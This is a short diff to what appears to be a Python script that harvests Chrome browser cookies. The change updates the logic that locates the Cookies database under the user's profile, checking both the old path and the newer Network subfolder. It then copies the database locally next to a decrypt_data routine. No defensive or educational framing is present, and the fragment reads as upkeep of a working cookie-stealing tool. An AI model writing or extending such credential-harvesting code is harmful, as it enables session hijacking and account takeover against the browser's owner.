@@ -48,8 +48,11 @@ def decrypt_data(data, key):
 
 def main():
     cookies_info=''
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                            "Google", "Chrome", "User Data", "default", "Network", "Cookies")
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default")
+    if "Cookies" in os.listdir(db_path):
+        db_path = os.path.join(db_path, "Cookies")
+    else:
+        db_path = os.path.join(db_path, "Network", "Cookies")
     filename = "Cookies.db"
     if not os.path.isfile(filename):
         shutil.copyfile(db_path, filename)
